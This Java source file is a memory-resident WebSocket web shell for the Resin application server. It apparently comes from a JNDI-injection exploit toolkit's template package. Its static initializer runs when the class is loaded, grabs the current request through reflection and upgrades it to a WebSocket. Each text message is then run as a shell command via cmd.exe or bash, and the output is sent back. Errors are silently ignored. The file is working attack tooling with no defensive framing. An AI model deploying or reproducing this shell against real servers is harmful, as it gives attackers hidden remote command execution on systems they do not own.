package com.qi4l.jndi.template.memshell.resin;

import com.caucho.websocket.WebSocketContext;
import com.caucho.websocket.WebSocketListener;
import com.caucho.websocket.WebSocketServletRequest;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.Reader;

public class WsResin implements WebSocketListener {

    static {
        try {
            ClassLoader classloader          = Thread.currentThread().getContextClassLoader();
            Class       servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object      contextRequest       = servletInvocationcls.getMethod("getContextRequest").invoke(null);
            String      protocol             = (String) contextRequest.getClass().getMethod("getHeader").invoke(contextRequest, "Upgrade");
            //String protocol       = request.getHeader("Upgrade");
            if (!"websocket".equals(protocol)) {
                System.out.println("not websocket");
                System.exit(0);
            }
            WebSocketListener       listener = new WsResin();
            WebSocketServletRequest wsReq    = (WebSocketServletRequest) contextRequest;
            wsReq.startWebSocket(listener);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onReadText(WebSocketContext context, Reader is) throws IOException {
        StringBuilder sb = new StringBuilder();
        int           ch;
        while ((ch = is.read()) >= 0) {
            sb.append((char) ch);
        }
        try {
            Process process;
            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
            if (bool) {
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", sb.toString()});
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", sb.toString()});
            }
            InputStream   inputStream   = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int           i;
            while ((i = inputStream.read()) != -1)
                stringBuilder.append((char) i);
            inputStream.close();
            process.waitFor();
            PrintWriter writer = context.startTextMessage();
            writer.print(stringBuilder);
            writer.close();
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onClose(WebSocketContext webSocketContext) throws IOException {

    }

    @Override
    public void onDisconnect(WebSocketContext webSocketContext) throws IOException {

    }

    @Override
    public void onTimeout(WebSocketContext webSocketContext) throws IOException {

    }

    @Override
    public void onStart(WebSocketContext webSocketContext) throws IOException {

    }

    @Override
    public void onReadBinary(WebSocketContext webSocketContext, InputStream inputStream) throws IOException {

    }
}
